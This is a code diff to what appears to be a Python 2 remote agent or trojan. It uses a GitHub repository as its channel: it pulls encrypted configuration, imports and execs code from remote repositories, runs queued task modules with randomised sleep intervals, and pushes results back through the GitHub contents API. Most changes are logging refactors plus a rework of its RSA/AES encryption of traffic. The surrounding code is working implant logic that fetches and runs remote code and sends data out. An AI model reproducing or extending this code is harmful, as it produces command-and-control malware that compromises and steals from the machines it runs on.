@@ -41,7 +41,9 @@ except ImportError:
 
 # fmt = '%(asctime)s %(filename)s[line:%(lineno)d] %(levelname)s %(message)s'
 fmt = '[%(asctime)s] [%(levelname)s] [ %(filename)s:%(lineno)s ] %(message)s '
-logging.basicConfig(level=logging.INFO, format=fmt)
+logging.basicConfig(format=fmt)
+log = logging.getLogger(__name__)
+log.setLevel(logging.DEBUG)
 
 
 class GitHubAPI(object):
@@ -70,12 +72,12 @@ class GitHubAPI(object):
         if data:
             data = json.dumps(data, ensure_ascii=False)
         try:
-            logging.info('Start to request: %s' % url)
-            logging.debug('Request data: %s' % data)
+            log.info('Start to request: %s' % url)
+            log.debug('Request data: %s' % data)
             rsp = urlopen(req, data)
         except Exception as e:
-            logging.error('[-] Request error: %s' % url)
-            logging.exception(e)
+            log.error('[-] Request error: %s' % url)
+            log.exception(e)
             rsp = None
         return rsp
 
@@ -97,7 +99,7 @@ class GitHubAPI(object):
         """
         uri = '/repos/%s/%s/contents/%s' % (self.owner, self.repo, path)
         data = {'message': msg, 'content': content.encode('base64')}
-        logging.info('[*] Save result to %s' % path)
+        log.info('[*] Save result to %s' % path)
         return self.request('PUT', uri, data)
 
     def get(self, path):
@@ -172,6 +174,7 @@ class Agent(object):
 
     def init(self):
         self.conf = self.get_conf_try(self.conf_url)
+        print(self.conf)
         if not self.conf:
             return
         self.parse_conf()
@@ -308,6 +311,7 @@ class Agent(object):
     def get_content(self, url):
         try:
             conf = urlopen(url).read()
+            print(conf)
             if conf:
                 conf = self.decrypt(conf.strip())
                 return json.loads(conf)
@@ -360,12 +364,13 @@ class Agent(object):
         #     return task
 
     def random_key(self, num=16):
-        return ''.join(random.sample(string.printable, num))
+        samples = string.ascii_letters + string.digits + string.punctuation
+        return ''.join(random.sample(samples, num))
 
     def encrypt(self, content, raw=False, aes=True):
         if raw:
             return content
-        rkey = RSA.importKey(self.cmdpub.decode('hex'))
+        rkey = RSA.importKey(self.cmdpub)
 
         if not aes:
             return self.rsa_encrypt(content, rkey).encode('base64')
@@ -373,29 +378,37 @@ class Agent(object):
         akey = self.random_key()
         ec = self.aes_encrypt(content, akey)
         ek = self.rsa_encrypt(akey, rkey)
-        return ';;'.join((ec, ek)).encode('base64')
+        return '\n'.join((ec, ek)).encode('base64')
+
+    # def decrypt(self, content):
+    #     content = content.decode('base64') if content else ''
+    #     if ';;[]' in content:
+    #         return content[:-4]
+
+    #     rk = RSA.importKey(self.prikey)
+
+    #     if ';;' in content:
+    #         # parse encrypt content and encrypt key
+    #         c, e = content.split(';;')
+    #         if not e:
+    #             # no encrypt key
+    #             return self.aes_decrypt(c, self.aes_key)
+    #         else:
+    #             # have encrypt key, decrypt the key
+    #             ak = self.rsa_decrypt(e, rk)
+    #             # decrypt the content
+    #             return self.aes_decrypt(c, ak)
+    #     else:
+    #         # no aes encrypt
+    #         return self.rsa_decrypt(content, rk)
 
     def decrypt(self, content):
         content = content.decode('base64') if content else ''
-        if ';;[]' in content:
-            return content[:-4]
-
+        content, ak = content.rsplit('\n', 1)
         rk = RSA.importKey(self.prikey)
-
-        if ';;' in content:
-            # parse encrypt content and encrypt key
-            c, e = content.split(';;')
-            if not e:
-                # no encrypt key
-                return self.aes_decrypt(c, self.aes_key)
-            else:
-                # have encrypt key, decrypt the key
-                ak = self.rsa_decrypt(e, rk)
-                # decrypt the content
-                return self.aes_decrypt(c, ak)
-        else:
-            # no aes encrypt
-            return self.rsa_decrypt(content, rk)
+        key = self.rsa_decrypt(ak, rk)
+        content = self.aes_decrypt(content, key)
+        return content
 
     def rsa_encrypt(self, content, key=None):
         if not key:
@@ -429,11 +442,11 @@ class Agent(object):
     def load(repo, url, package='', module=None):
         if not package and not module:
             try:
-                logging.info('Try to import module')
+                log.info('Try to import module')
                 add_remote_repo([repo], url)
                 exec "import %s" % repo
             except Exception:
-                logging.error('Exception with import %s' % repo)
+                log.error('Exception with import %s' % repo)
                 pass
         else:
             pk = '.'.join((repo, package)) if package.split(
@@ -458,7 +471,7 @@ class Agent(object):
             exec "from %s import %s" % (pk, md)
 
     def unload(self, module, url=None):
-        logging.info('Try to unload module')
+        log.info('Try to unload module')
         url = url or self.base_url
         remove_remote_repo(url)
         if module in sys.modules:
@@ -491,22 +504,22 @@ class Agent(object):
 
     # def load_module(self, mod, pkg='toy.modules'):
     #     try:
-    #         logging.info('Import %s from %s' % (mod, pkg))
+    #         log.info('Import %s from %s' % (mod, pkg))
     #         self.load(self.repo, )
     #         exec "from %s import %s" % (pkg, mod)
     #     except Exception:
-    #         logging.error("Import %s error" % '.'.join((pkg, mod)))
+    #         log.error("Import %s error" % '.'.join((pkg, mod)))
 
     # def load_task(self, task_url):
     #     tasks = self.get(task_url)
-    #     logging.info('[+] Get task config: %s' % tasks)
+    #     log.info('[+] Get task config: %s' % tasks)
     #     if tasks:
     #         tasks = json.loads(tasks)
-    #         logging.info('[*] Get task %s from %s' % (tasks['name'], task_url))
+    #         log.info('[*] Get task %s from %s' % (tasks['name'], task_url))
     #         requires = tasks.get('require', {})
     #         for u, p in requires.items():
     #             for k in p:
-    #                 logging.info('[*] Load required packages: %s from %s' % (k, u))
+    #                 log.info('[*] Load required packages: %s from %s' % (k, u))
     #                 self.load([k], u)
     #         self.load(tasks['name'], tasks['url'])
     #         for task in tasks['task']:
@@ -539,7 +552,7 @@ class Agent(object):
         while True:
             if not self.run_modules.empty:
                 task = self.run_modules.get()
-                logging.info("run task %s" % task['mod'])
+                log.info("run task %s" % task['mod'])
                 mod = 'toy.module.%s' % task['mod']
                 arg = task.get('args', ())
                 kws = task.get('kws', {})
@@ -556,7 +569,7 @@ class Agent(object):
                 except Exception as e:
                     if self.debug:
                         print(e)
-                        logging.error('run exception')
+                        log.error('run exception')
 
             # time.sleep(self.cf)
             time.sleep(random.randint(10, 50))
